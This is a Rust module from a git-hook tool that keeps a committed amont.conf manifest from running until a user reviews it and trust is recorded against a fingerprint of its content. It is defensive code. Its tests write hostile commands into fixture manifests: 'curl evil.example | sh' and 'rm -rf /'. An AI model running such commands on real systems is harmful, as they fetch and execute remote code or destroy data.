//! Whether this repository's `amont.conf` may run.
//!
//! `amont.conf` is committed, which is the point — a team shares a check by
//! committing it. The consequence is that cloning a repository and committing to
//! it would otherwise run commands that repository chose, and neither of those
//! acts is one anybody performs as a decision about trust. Reviewing a diff
//! before running it is; nothing asked for that.
//!
//! So the manifest is inert until somebody says otherwise, and the record is
//! keyed on the FILE'S CONTENT rather than its path: a `git pull` that adds a
//! command does not inherit the consent given to the file before it.
//!
//! ## Why `git hash-object` and not a hash of our own
//!
//! `amont` links no external crates (`scripts/check-no-deps.sh`), and the
//! only hash in `std` is `DefaultHasher` — SipHash with a fixed key, which is
//! not collision-resistant and would let a crafted manifest match a trusted
//! one's fingerprint. Writing SHA-256 by hand is a hundred lines nobody would
//! review as carefully as they should.
//!
//! `git` is already a hard dependency of every path in this binary, and
//! `git hash-object` is the identity git itself uses for content. It is SHA-1
//! (or SHA-256 in a repository configured for it), which is not a strong
//! guarantee against a determined attacker with a chosen-prefix collision — but
//! it is enormously better than SipHash, costs no dependency, and a user can
//! reproduce it by hand to check what they trusted:
//!
//! ```text
//! $ git hash-object --no-filters amont.conf
//! ```
//!
//! `--no-filters` is not decoration. Without it git applies the clean filter
//! and eol conversion that the repository's own committed `.gitattributes`
//! asks for — so the repository would be choosing the transform its consent is
//! taken through, and two manifests this parser reads differently can be given
//! the same id. Consent is bound to the bytes we PARSE.

use std::path::Path;

use crate::ui::valid_sign;

/// Where the decision is recorded. Local, never committed — a repository must
/// not be able to declare itself trusted.
pub const KEY: &str = "amont.trusted";

/// Content id of `path`, as git would compute it.
///
/// `--no-filters`, because consent is bound to CONTENT and the content that
/// matters is the bytes we PARSE. Plain `git hash-object` applies the clean
/// filter and eol conversion configured by the repository's own committed
/// `.gitattributes` — so a repo that declares `amont.conf ident` (or
/// `text eol=crlf`) chooses the transform its fingerprint is taken through,
/// and two manifests we would parse differently can hash identically. The
/// binding was to content-after-a-repo-controlled-transform.
pub fn fingerprint(repo: &Path, manifest: &Path) -> Option<String> {
    crate::git::stdout_in(repo, &["hash-object", "--no-filters", manifest.to_str()?])
}

/// The same identity, for bytes already in hand.
///
/// `--stdin` is never filtered, so this names exactly the buffer given to it.
/// Used where the caller has read the file and is about to act on THAT read:
/// hashing the path again would be a second read, and the two can differ.
pub fn fingerprint_bytes(repo: &Path, bytes: &[u8]) -> Option<String> {
    crate::git::stdout_piped_in(repo, &["hash-object", "--stdin"], bytes)
}

/// What the repository has recorded, if anything.
pub fn recorded(repo: &Path) -> Option<String> {
    crate::git::stdout_in(repo, &["config", "--local", "--get", KEY])
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum State {
    /// No manifest. The overwhelmingly common case, and it must cost nothing.
    NoManifest,
    /// Trusted, and the file still has the bytes that were trusted.
    Trusted,
    /// Never trusted here.
    Untrusted,
    /// Trusted once, and edited since. Distinct from `Untrusted` because the
    /// message should say which happened — "somebody changed it" is a different
    /// thing to tell a reader than "you have not looked at this yet".
    Changed,
}

/// Decide whether `repo`'s manifest may run.
pub fn state(repo: &Path) -> State {
    let manifest = repo.join(crate::manifest::MANIFEST);
    if !manifest.is_file() {
        return State::NoManifest;
    }
    let Some(current) = fingerprint(repo, &manifest) else {
        // Cannot compute it, so cannot claim it matches.
        return State::Untrusted;
    };
    verdict(repo, &current)
}

/// The same decision, about bytes the caller already holds.
///
/// For anyone who has read the manifest and is about to act on THAT read.
/// Re-opening the file to decide whether the first read may run is two reads of
/// something that can change in between, and the whole point of the record is
/// that it names the content being executed.
pub fn state_of(repo: &Path, source: &[u8]) -> State {
    let Some(current) = fingerprint_bytes(repo, source) else {
        return State::Untrusted;
    };
    verdict(repo, &current)
}

fn verdict(repo: &Path, current: &str) -> State {
    match recorded(repo) {
        Some(seen) if seen == current => State::Trusted,
        Some(_) => State::Changed,
        None => State::Untrusted,
    }
}

/// Record the manifest as it stands now.
pub fn record(repo: &Path) -> Result<String, String> {
    let manifest = repo.join(crate::manifest::MANIFEST);
    let fp = fingerprint(repo, &manifest)
        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
    record_verified(repo, &fp)?;
    Ok(fp)
}

/// Record `fp` as trusted, but ONLY if the manifest still hashes to it.
///
/// The gap this closes: `describe()` prints the manifest, then — in
/// `install::offer_trust` — `confirm()` blocks on a keypress, sometimes for
/// several seconds, before anything is recorded. A plain re-hash at that
/// point trusts whatever is on disk THEN, which is not necessarily what was
/// shown; a file changed in that window would be trusted without ever having
/// been reviewed, which is the exact thing this module exists to prevent.
/// Callers fingerprint what they show BEFORE asking, and pass that same
/// value here — verified again, not merely assumed, once the answer is in.
pub fn record_verified(repo: &Path, fp: &str) -> Result<(), String> {
    let manifest = repo.join(crate::manifest::MANIFEST);
    let now = fingerprint(repo, &manifest)
        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
    if now != fp {
        return Err(format!(
            "{} changed since it was shown — nothing was trusted; run `amont trust` again to review it",
            crate::manifest::MANIFEST
        ));
    }
    let ok = crate::git::stdout_in(repo, &["config", "--local", KEY, fp]).is_some();
    if !ok {
        return Err(format!("cannot record {KEY} in this repository"));
    }
    Ok(())
}

/// Forget it.
pub fn revoke(repo: &Path) -> Result<(), String> {
    // `--unset` exits 5 when the key is absent, which is not a failure here.
    let _ = crate::git::stdout_in(repo, &["config", "--local", "--unset", KEY]);
    Ok(())
}

/// The reason an external does not run, phrased for the check's own report.
pub fn why(state: State) -> Option<&'static str> {
    match state {
        State::NoManifest | State::Trusted => None,
        State::Untrusted => {
            Some("declared in an untrusted amont.conf — review it, then `amont trust`")
        }
        State::Changed => {
            Some("amont.conf changed since it was trusted — review it, then `amont trust`")
        }
    }
}

/// Show what the manifest declares, so the decision is made with it in view.
///
/// Printing the lines is the whole point: "trust this file" is not a question
/// anybody can answer without seeing it, and a prompt that does not show it is
/// a prompt that trains people to press y.
pub fn describe(repo: &Path) -> String {
    describe_source(
        &std::fs::read_to_string(repo.join(crate::manifest::MANIFEST)).unwrap_or_default(),
    )
}

/// The same listing, rendered from text the caller already read.
///
/// So that what is SHOWN and what is FINGERPRINTED come from one read. Two
/// reads of a file somebody is deciding about can disagree, and the decision
/// would then be recorded about bytes nobody was shown.
pub fn describe_source(text: &str) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    let lines = crate::manifest::parse_lines(text);
    // Policy and tool-pin lines are rendered as their own blocks below —
    // they are not checks, and running them through the check table printed
    // them as `! broken`, which told the person consenting that something
    // was WRONG with the very lines they were being asked to approve.
    let (checks, rest): (Vec<_>, Vec<_>) = lines.into_iter().partition(|l| l.is_check());
    for line in checks {
        let (name, stage, parsed) = line.into_parts();
        // Every field here is repo-controlled, and this is the text somebody
        // is about to say yes to. Sanitised BEFORE the padding, so the column
        // widths are computed on what is actually printed — an escape sequence
        // is zero columns wide and would silently shift the alignment even if
        // it did nothing worse. See `ui::sanitize` for what a concealed
        // declaration bought.
        let name = crate::ui::sanitize(&name);
        match parsed {
            Ok(declared) => {
                let _ = writeln!(
                    out,
                    "      {name:<14} {:<10} {}",
                    stage.as_str(),
                    crate::ui::sanitize(&declared.command())
                );
            }
            Err(why) => {
                let _ = writeln!(
                    out,
                    "      {name:<14} {:<10} ! {}",
                    stage.as_str(),
                    crate::ui::sanitize(&why.to_string())
                );
            }
        }
    }
    let pins: Vec<String> = rest
        .iter()
        .filter_map(|l| match l {
            crate::manifest::Line::Tool(pin) => {
                Some(format!("tool      {}  {}", pin.program, pin.want))
            }
            _ => None,
        })
        .collect();
    let policy: Vec<String> = rest
        .iter()
        .filter_map(|l| match l {
            crate::manifest::Line::Policy { what, .. } => Some(what.describe()),
            _ => None,
        })
        .collect();
    if !policy.is_empty() {
        let _ = writeln!(out, "    and sets policy for built-in checks:");
        for p in policy {
            let _ = writeln!(out, "      {}", crate::ui::sanitize(&p));
        }
    }
    if !pins.is_empty() {
        let _ = writeln!(out, "    and pins tool versions (verified, warn-only):");
        for p in pins {
            let _ = writeln!(out, "      {}", crate::ui::sanitize(&p));
        }
    }
    out
}

/// A yes/no on the terminal, or `false` when there is nobody to ask.
///
/// Reads `/dev/tty` rather than stdin: git hands a hook a pipe, and a prompt
/// that read stdin would consume something else's input. Same reason
/// `package-lock` does it, and the third copy of this is where it becomes a
/// shared function.
#[cfg(unix)]
pub fn confirm(prompt: &str) -> bool {
    use std::io::{BufRead, BufReader, Write};
    let Ok(tty) = std::fs::File::open("/dev/tty") else {
        return false;
    };
    print!("{prompt}");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    if BufReader::new(tty).read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim_start().chars().next(), Some('y') | Some('Y'))
}

/// `CONIN$` is the console's `/dev/tty`: it reaches the keyboard even when
/// git handed this hook a pipe for stdin. Opening it fails where there is
/// no console at all (a service, CI), which correctly reads as nobody to
/// ask. Before this, Windows always declined — `amont trust` could never
/// be granted interactively there, so every declared check spent its life
/// politely disabled for the Windows minority of a team.
#[cfg(windows)]
pub fn confirm(prompt: &str) -> bool {
    use std::io::{BufRead, BufReader, Write};
    let Ok(con) = std::fs::File::open("CONIN$") else {
        return false;
    };
    print!("{prompt}");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    if BufReader::new(con).read_line(&mut line).is_err() {
        return false;
    }
    matches!(line.trim_start().chars().next(), Some('y') | Some('Y'))
}

/// Neither `/dev/tty` nor a console: nobody to ask, which declines.
#[cfg(not(any(unix, windows)))]
pub fn confirm(_prompt: &str) -> bool {
    false
}

/// `amont trust [--show|--revoke]`.
pub fn command(args: &[std::ffi::OsString]) -> Result<(), String> {
    // Refuse rather than fall back to ".". Trust is RECORDED per repository,
    // keyed by the root this resolves to, so a "." root outside a repository
    // meant `amont trust` in `~` would read `~/amont.conf`, show its
    // declarations, and record trust for them — against a repository that does
    // not exist, in a state no later `amont trust --revoke` would find.
    let root = crate::hooks::common::repo_root_checked()?;
    let root = Path::new(&root);
    let flag = |f: &str| args.iter().any(|a| a == f);

    if flag("--revoke") {
        revoke(root)?;
        println!("{} amont.conf is no longer trusted here", valid_sign());
        return Ok(());
    }

    let state = state(root);
    if state == State::NoManifest {
        println!("no {} in this repository", crate::manifest::MANIFEST);
        return Ok(());
    }

    if flag("--show") {
        println!("{}", crate::manifest::MANIFEST);
        print!("{}", describe(root));
        println!(
            "    {}",
            match state {
                State::Trusted => "trusted here",
                State::Changed => "TRUSTED ONCE, AND CHANGED SINCE — not running",
                _ => "not trusted here — not running",
            }
        );
        return Ok(());
    }

    if state == State::Trusted {
        println!("{} already trusted, unchanged", valid_sign());
        return Ok(());
    }

    // One read: the bytes shown are the bytes fingerprinted, and
    // `record_verified` then confirms they are still the bytes on disk. Read
    // twice, and the listing somebody approved need not be what got recorded.
    let manifest = root.join(crate::manifest::MANIFEST);
    let source =
        std::fs::read(&manifest).map_err(|e| format!("cannot read {}: {e}", manifest.display()))?;
    let fp = fingerprint_bytes(root, &source)
        .ok_or_else(|| format!("cannot hash {}", manifest.display()))?;
    println!("{} declares:", crate::manifest::MANIFEST);
    print!("{}", describe_source(&String::from_utf8_lossy(&source)));
    record_verified(root, &fp)?;
    println!("{} trusted ({fp})", valid_sign());
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn repo(name: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("trust-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        std::process::Command::new("git")
            .args(["init", "-q", "--template=", "."])
            .current_dir(&d)
            .output()
            .expect("git");
        d
    }

    fn write_manifest(dir: &Path, body: &str) {
        std::fs::write(dir.join(crate::manifest::MANIFEST), body).unwrap();
    }

    /// Ninety-six repositories have no manifest. That must be free and silent.
    #[test]
    fn no_manifest_is_not_a_trust_question() {
        let d = repo("none");
        assert_eq!(state(&d), State::NoManifest);
        assert_eq!(why(State::NoManifest), None);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn a_manifest_starts_untrusted() {
        let d = repo("new");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        assert_eq!(state(&d), State::Untrusted);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn recording_makes_it_trusted() {
        let d = repo("record");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        assert_eq!(state(&d), State::Trusted);
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The property the whole design turns on: consent is to CONTENT, so a
    /// `git pull` that adds a command cannot inherit it.
    #[test]
    fn editing_the_manifest_revokes_trust() {
        let d = repo("edit");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        assert_eq!(state(&d), State::Trusted);

        write_manifest(&d, "pre-commit  a  *  block  curl evil.example | sh\n");
        assert_eq!(
            state(&d),
            State::Changed,
            "a manifest edited after trusting must not still be trusted"
        );
        // And it says which happened, because "you have not looked at this" is
        // a different sentence to "somebody changed it".
        assert!(why(State::Changed).expect("reason").contains("changed"));
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The TOCTOU `record_verified` exists to close: `install::offer_trust`
    /// fingerprints what it showed, waits on a keypress, then must not trust
    /// whatever is on disk by the time the answer comes back if that is not
    /// what was actually shown.
    #[test]
    fn record_verified_refuses_a_manifest_that_changed_since_it_was_fingerprinted() {
        let d = repo("changed-mid-confirm");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        let manifest = d.join(crate::manifest::MANIFEST);
        let shown_fp = fingerprint(&d, &manifest).expect("fingerprint");

        // The file is rewritten in the window a real confirm() would have
        // been blocking on a keypress.
        write_manifest(&d, "pre-commit  a  *  block  curl evil.example | sh\n");

        let err = record_verified(&d, &shown_fp).expect_err("must refuse");
        assert!(err.contains("changed"), "{err}");
        assert_eq!(
            state(&d),
            State::Untrusted,
            "the rewritten content must not end up trusted"
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    /// The ordinary path still works: nothing changed, so the fingerprint
    /// shown is the fingerprint recorded.
    #[test]
    fn record_verified_accepts_a_manifest_that_did_not_change() {
        let d = repo("unchanged");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        let manifest = d.join(crate::manifest::MANIFEST);
        let fp = fingerprint(&d, &manifest).expect("fingerprint");
        record_verified(&d, &fp).expect("record");
        assert_eq!(state(&d), State::Trusted);
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn revoking_returns_it_to_untrusted() {
        let d = repo("revoke");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        record(&d).expect("record");
        revoke(&d).expect("revoke");
        assert_eq!(state(&d), State::Untrusted);
        // Twice is not an error: `git config --unset` exits 5 on a missing key.
        revoke(&d).expect("revoke again");
        let _ = std::fs::remove_dir_all(&d);
    }

    /// Reproducible by hand, which is the point of using git's own identity.
    #[test]
    fn the_fingerprint_is_git_hash_object() {
        let d = repo("fp");
        write_manifest(&d, "pre-commit  a  *  block  echo hi\n");
        let manifest = d.join(crate::manifest::MANIFEST);
        let ours = fingerprint(&d, &manifest).expect("fingerprint");
        let theirs = String::from_utf8_lossy(
            &std::process::Command::new("git")
                .args(["hash-object", "--no-filters", manifest.to_str().unwrap()])
                .current_dir(&d)
                .output()
                .expect("git")
                .stdout,
        )
        .trim()
        .to_string();
        assert_eq!(ours, theirs);
        let _ = std::fs::remove_dir_all(&d);
    }
    /// A repository must not choose the transform its own consent is taken
    /// through.
    ///
    /// `.gitattributes` is committed, so the repo picks the clean filter; plain
    /// `git hash-object` applies it. With one that collapses everything to a
    /// constant, two manifests this parser reads DIFFERENTLY are given the same
    /// id — so a trusted fingerprint would cover content nobody reviewed.
    #[test]
    fn a_clean_filter_cannot_make_two_manifests_share_a_fingerprint() {
        let d = repo("filter");
        std::fs::write(d.join(".gitattributes"), "amont.conf filter=flatten\n")
            .expect("write attributes");
        let ok = std::process::Command::new("git")
            .args(["config", "--local", "filter.flatten.clean", "echo same"])
            .current_dir(&d)
            .status()
            .map(|s| s.success())
            .unwrap_or(false);
        if !ok {
            return; // no git to configure; nothing to assert
        }
        let manifest = d.join(crate::manifest::MANIFEST);

        write_manifest(&d, "pre-commit  a  *  block  echo one\n");
        let filtered_a = raw_hash(&d, &manifest);
        let ours_a = fingerprint(&d, &manifest).expect("fingerprint a");

        write_manifest(&d, "pre-commit  b  *  block  rm -rf /\n");
        let filtered_b = raw_hash(&d, &manifest);
        let ours_b = fingerprint(&d, &manifest).expect("fingerprint b");

        // The collision has to EXIST before its absence means anything. A
        // clean filter is an external program run through git's own shell, and
        // whether `echo` resolves that way is the platform's business, not
        // ours — Git for Windows does not collapse these. Say so and stop,
        // rather than report a fixture that would not build as a defect in the
        // code under test. `an_eol_conversion_cannot_...` below covers the same
        // property with no external program involved and runs everywhere.
        if filtered_a != filtered_b {
            println!(
                "! clean filters do not apply here — collision not reproducible, \
                 see an_eol_conversion_cannot_make_two_manifests_share_a_fingerprint"
            );
            return;
        }
        assert_ne!(
            ours_a, ours_b,
            "the fingerprint followed a repo-controlled filter"
        );
    }

    /// The same property, with git's own eol conversion instead of an external
    /// filter — so it holds on every platform.
    ///
    /// `.gitattributes` is COMMITTED, so the repository chooses the conversion.
    /// Under `text eol=lf`, git's clean step normalises CRLF to LF, and two
    /// files differing only in line endings hash identically. That is a weaker
    /// lever than a clean filter (the parser reads both the same way), but it
    /// is the same mistake: the id names content-after-a-repo-controlled
    /// transform rather than the bytes we read.
    #[test]
    fn an_eol_conversion_cannot_make_two_manifests_share_a_fingerprint() {
        let d = repo("eol");
        std::fs::write(d.join(".gitattributes"), "amont.conf text eol=lf\n")
            .expect("write attributes");
        let manifest = d.join(crate::manifest::MANIFEST);

        // Byte-different, line-ending-identical-after-normalisation.
        std::fs::write(&manifest, b"pre-commit  a  *  block  echo one\r\n").expect("crlf");
        let filtered_crlf = raw_hash(&d, &manifest);
        let ours_crlf = fingerprint(&d, &manifest).expect("fingerprint crlf");

        std::fs::write(&manifest, b"pre-commit  a  *  block  echo one\n").expect("lf");
        let filtered_lf = raw_hash(&d, &manifest);
        let ours_lf = fingerprint(&d, &manifest).expect("fingerprint lf");

        if filtered_crlf != filtered_lf {
            println!("! eol conversion does not apply here — collision not reproducible");
            return;
        }
        assert_ne!(
            ours_crlf, ours_lf,
            "the fingerprint followed a repo-controlled eol conversion"
        );
    }

    fn raw_hash(dir: &std::path::Path, manifest: &std::path::Path) -> String {
        String::from_utf8_lossy(
            &std::process::Command::new("git")
                .args(["hash-object", manifest.to_str().unwrap()])
                .current_dir(dir)
                .output()
                .expect("git")
                .stdout,
        )
        .trim()
        .to_string()
    }
}
